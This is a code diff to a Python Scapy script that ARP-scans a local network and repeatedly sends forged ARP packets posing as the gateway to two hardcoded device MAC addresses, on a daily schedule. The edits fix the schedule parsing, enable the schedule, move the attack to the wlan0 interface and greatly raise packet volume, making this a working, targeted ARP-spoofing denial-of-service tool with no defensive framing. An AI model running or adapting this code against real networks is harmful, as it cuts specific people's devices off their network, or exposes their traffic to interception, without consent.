@@ -68,7 +68,7 @@ def ScanfByArp(Retry=4,Delay=4):
     for i in range(0,Retry):
         time.sleep(i*Delay)
         #Clear the table at first
-        ScanfByArpOnce(Start=100,End=150,TimeOut=5,ClearAtFirst=i)
+        ScanfByArpOnce(Start=100,End=150,TimeOut=Delay,ClearAtFirst=i)
 
 def GetIpByMac(Mac):
     return Table.get(Mac)
@@ -98,8 +98,13 @@ def GetLanInf(GWIP="192.168.0.1",Debug=True):
     if GW_mac is None:return
     if Debug is True:print("%s -> %s"%(GW_ip,GW_mac))
 
-def GetAllHostInf():ScanfByArp(3,1)
-
+def GetAllHostInf(TargtMAC,Debug=True):
+    ScanfByArp(2,2)
+    if Debug is True:
+        for targtmac in  TargtMAC:
+            targetip=GetIpByMac(targtmac)
+            if targetip is not None:print("%s -> %s"%(targetip,targtmac))
+    
 def GeneratePacket_1(PackNum,TargtMAC):
     PKT = []
     for targtmac in TargtMAC:
@@ -109,10 +114,10 @@ def GeneratePacket_1(PackNum,TargtMAC):
             PKT_ = Ether(dst=targtmac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=targtIP,hwdst=targtmac)
             PKT.append(PKT_)
     return PKT
-def SendPacket(PKT=[],Counter=1,Interval=1,Debug=True):
+def SendPacket(Face,PKT,Counter=1,Interval=1,Debug=True):
     if len(PKT) is 0:
         if Debug is True:print("Send zero packet....");return
-    for num in range(1,Counter+1):
+    for num in range(0,Counter):
         try:
             sendp(PKT,iface = Face);
             if Debug is True:print("Wair for %s S had sent %s packets"%(Interval,num))
@@ -124,8 +129,8 @@ def ShouldWeAttack(ScheduleTable,Debug=True):
     CurMinu=time.localtime(time.time()).tm_min
     CurCounter=CurHour*60+CurMinu
     for i in range(0,len(ScheduleTable)//4):
-        Temp_Start=ScheduleTable[i*2+0]*60+ScheduleTable[i*2+1]
-        Temp_End=ScheduleTable[i*2+2]*60+ScheduleTable[i*2+3]
+        Temp_Start=ScheduleTable[i*4+0]*60+ScheduleTable[i*4+1]
+        Temp_End=ScheduleTable[i*4+2]*60+ScheduleTable[i*4+3]
         if (CurCounter>Temp_Start)and(CurCounter<Temp_End):return True
     if Debug is True:
         print(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time())))
@@ -134,9 +139,9 @@ def ShouldWeAttack(ScheduleTable,Debug=True):
 def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
     GetOurInf(Face,Debug = True)
     GetLanInf(GWIP="192.168.0.1",Debug=True)
-    GetAllHostInf()
+    GetAllHostInf(MAC,Debug=True)
     PKT=GeneratePacket_1(PackNum,MAC)
-    SendPacket(PKT,Counter,Interval)
+    SendPacket(Face,PKT,Counter,Interval)
     return 
     
 def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
@@ -161,10 +166,10 @@ if __name__ == "__main__":
     #0:00~2:30
     #6:00~8:30
     #17:30~23:59
-    #ScheduleTable=[0,0,2,30,6,0,8,30,17,30,23,59]
+    ScheduleTable=[0,0,2,30,6,0,8,30,17,30,23,59]
     #ScheduleTable=[0,0,23,59]
     TargetMac = ["04:e6:76:46:a6:f3","78:02:f8:34:4d:b5"]
     while True:
         if ShouldWeAttack(ScheduleTable,True) is False:time.sleep(10);continue
-        EnsureWifiConnection("192.168.0.1","ens33",2)
-        Attack_MAC("ens33","192.168.0.1",TargetMac,10,10,1)
+        EnsureWifiConnection("192.168.0.1","wlan0",2)
+        Attack_MAC("wlan0","192.168.0.1",TargetMac,50,1000,0.5)
